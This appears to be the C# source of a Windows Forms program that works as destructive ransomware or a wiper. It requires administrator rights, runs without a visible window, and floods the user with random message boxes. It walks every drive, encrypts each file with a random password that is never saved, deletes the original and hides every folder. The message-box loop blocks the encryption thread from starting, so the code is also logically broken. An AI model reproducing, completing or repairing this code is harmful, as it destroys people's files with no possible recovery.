using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Config;
using msvpc;
using Properties;

public partial class Main : Form
{
    private readonly Random _random = new Random();
    private Config.Config _config;
    private Thread _thread;

    public Main()
    {
        InitializeComponent();
        Configure();
    }

    private void Configure()
    {
        CheckAdminPrivileges();
        LoadConfig();
        SpamUser();
        InitThread();
    }

    private void CheckAdminPrivileges()
    {
        if (IsElevated()) return;
        MessageBox.Show(Resources.ProgrammInAdministratorModeText, Resources.ProgrammInAdministratorModeCaption,
            MessageBoxButtons.OK, MessageBoxIcon.Error);
        Environment.Exit(0);
    }

    private void InitThread()
    {
        _thread = new Thread(Run);
        _thread.Start();
    }

    protected override void SetVisibleCore(bool value)
    {
        base.SetVisibleCore(false);
    }

    private void LoadConfig()
    {
        try
        {
            _config = Import.LoadConfigFromXmlFile(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Config.xml"));
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message + ex.StackTrace, ex.Message, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }

    private void SpamUser()
    {
        while (true)
        {
            try
            {
                var message = GetRandomMessage();
                MessageBox.Show(message.Name, message.Caption, GetRandomButtons(), GetRandomIcon());
                Thread.Sleep(_random.Next(2300));
            }
            catch
            {
                // ignored
            }
        }
        // ReSharper disable once FunctionNeverReturns
    }

    private Message GetRandomMessage()
    {
        return _config.Messages.ElementAt(_random.Next(_config.Messages.Count));
    }

    private MessageBoxButtons GetRandomButtons()
    {
        var values = Enum.GetValues(typeof(MessageBoxButtons));
        return (MessageBoxButtons) values.GetValue(_random.Next(values.Length));
    }

    private MessageBoxIcon GetRandomIcon()
    {
        var values = Enum.GetValues(typeof(MessageBoxIcon));
        return (MessageBoxIcon) values.GetValue(_random.Next(values.Length));
    }

    private string GetRandomPassword()
    {
        var alg = SHA512.Create();
        alg.ComputeHash(Encoding.UTF8.GetBytes(DateTime.Now.ToLongDateString() + _random.Next(int.MaxValue)));
        return BitConverter.ToString(alg.Hash);
    }

    private void Run()
    {
        foreach (var drive in DriveInfo.GetDrives())
        {
            try
            {
                EncryptFs(drive.Name);
            }
            catch
            {
                // ignored
            }
        }
    }

    private void EncryptFs(string directory)
    {
        foreach (var file in Directory.GetFiles(directory))
        {
            try
            {
                if (file == null) continue;
                Msvpc.UseE(GetRandomPassword(), file,
                    Path.Combine(directory, Path.GetFileNameWithoutExtension(file)) + Resources.Ending);
                File.Delete(file);
            }
            catch
            {
                // ignored
            }
        }

        foreach (var dir in Directory.GetDirectories(directory))
        {
            HideDirectory(dir);
            EncryptFs(dir);
        }
    }

    private void HideDirectory(string dir)
    {
        var di = new DirectoryInfo(dir);
        if ((di.Attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
        {
            di.Attributes |= FileAttributes.Hidden;
        }
    }

    private bool IsElevated()
    {
        var id = WindowsIdentity.GetCurrent();
        return id.Owner != id.User;
    }
}